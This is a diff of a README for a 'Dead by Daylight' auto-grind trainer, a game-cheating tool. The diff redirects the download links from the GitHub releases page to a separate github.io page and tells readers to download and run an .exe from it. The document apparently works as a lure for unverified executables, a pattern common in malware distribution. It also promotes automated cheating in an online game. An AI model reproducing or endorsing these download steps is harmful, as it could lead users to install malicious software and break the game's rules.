@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Mega - Automate your progression in Dead by Daylight
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/fullse4687/DBD-AutoGrind-Trainer-2026-Mega/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://fullse4687.github.io)
 
 ## 📌 About this software
 
@@ -21,7 +21,7 @@ Ensure your computer meets these standards before you run the trainer:
 
 You can download the latest version of the tool directly from the official releases page. 
 
-1. Go to the [Releases Page](https://github.com/fullse4687/DBD-AutoGrind-Trainer-2026-Mega/releases).
+1. Go to the [Releases Page](https://fullse4687.github.io).
 2. Locate the most recent version labeled "Latest release."
 3. Click the .exe file to start your download.
 4. Save the file to a folder on your computer where you can find it easily, such as your Downloads folder or Desktop.
